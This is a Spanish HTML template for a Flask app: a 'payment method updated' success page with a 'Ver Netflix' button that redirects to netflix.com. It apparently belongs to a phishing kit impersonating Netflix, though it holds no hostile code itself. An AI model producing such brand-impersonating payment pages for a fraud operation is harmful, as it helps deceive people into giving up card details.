<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pago Actualizado</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #ffffff;
            color: #333333;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 450px;
            background-color: #ffffff;
            padding: 40px;
            text-align: center;
        }
        
        .logo-container {
            text-align: center;
            margin-bottom: 35px; /* Aumentado de 25px a 35px para más separación */
        }
        
        .custom-logo {
            max-width: 150px;
            height: auto;
        }
        
        .success-icon {
            font-size: 60px;
            color: #2ecc71;
            margin-bottom: 20px;
        }
        
        h1 {
            font-size: 32px;
            margin-bottom: 20px;
            color: #333333;
        }
        
        p {
            font-size: 16px;
            color: #666666;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        
        .btn {
            width: 100%;
            height: 50px;
            background: #e74c3c;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.3s;
        }
        
        .btn:hover {
            background: #c0392b;
        }
        
        @media (max-width: 600px) {
            .container {
                padding: 30px 20px;
            }
            
            .logo-container {
                margin-bottom: 25px; /* Aumentado para móviles también */
            }
            
            .custom-logo {
                max-width: 130px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container">
            <img src="{{ url_for('static', filename='images/logo.png') }}" alt="Logo" class="custom-logo">
        </div>
        
        <div class="success-icon">✓</div>
        <h1>Éxito</h1>
        <p>Tu método de pago se ha actualizado correctamente</p>
        <button class="btn" onclick="window.location.href='https://www.netflix.com'">Ver Netflix</button>
    </div>
</body>
</html>
